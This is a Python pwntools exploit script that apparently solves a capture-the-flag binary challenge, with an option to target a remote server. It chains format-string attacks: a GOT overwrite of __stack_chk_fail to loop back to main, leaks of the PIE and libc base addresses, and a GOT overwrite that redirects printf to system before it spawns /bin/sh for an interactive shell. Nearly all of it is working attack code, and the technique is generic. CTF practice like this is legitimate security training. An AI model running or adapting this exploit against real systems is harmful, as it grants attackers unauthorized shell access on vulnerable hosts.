#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./chall"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.29.214.123"
  PORT = 5000
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6", checksec=False)
else:
  s = process(BINARY)
  libc = elf.libc  

# got overwrite __stack_chk_fail -> main()
buf  = b"%21065c%9$hn"
buf += b"A"*(0x11 - len(buf))
buf += b"\x18\x80"
s.send(buf)

# pie leak
sleep(0.5)
buf = b"%9$p"
s.sendline(buf)
s.recvuntil(b"0x")
pie_leak = int(s.recvuntil("\n"), 16)
pie_base = pie_leak - 0x1275
print("pie_leak =", hex(pie_leak))
print("pie_base =", hex(pie_base))
s.recvn(10)

# libc leak
buf = b"%8$s"
buf += b"A"*(0x9 - len(buf))
buf += p64(pie_base + elf.got.read)  
s.sendline(buf)
read_addr = u64(s.recvn(6) + b"\x00\x00")
libc_base = read_addr - libc.sym.read
print("read_addr =", hex(read_addr))
print("libc_base =", hex(libc_base))

# got overwrite printf => system
index = 7
system_addr = libc_base + libc.sym.system
writes = {pie_base + elf.got.printf: system_addr}
buf = b"A"
buf += fmtstr_payload(index, writes, numbwritten = 1, write_size='byte')
s.sendline(buf)

# start system("/bin/sh")
s.sendline("/bin/sh\x00")

s.interactive() 
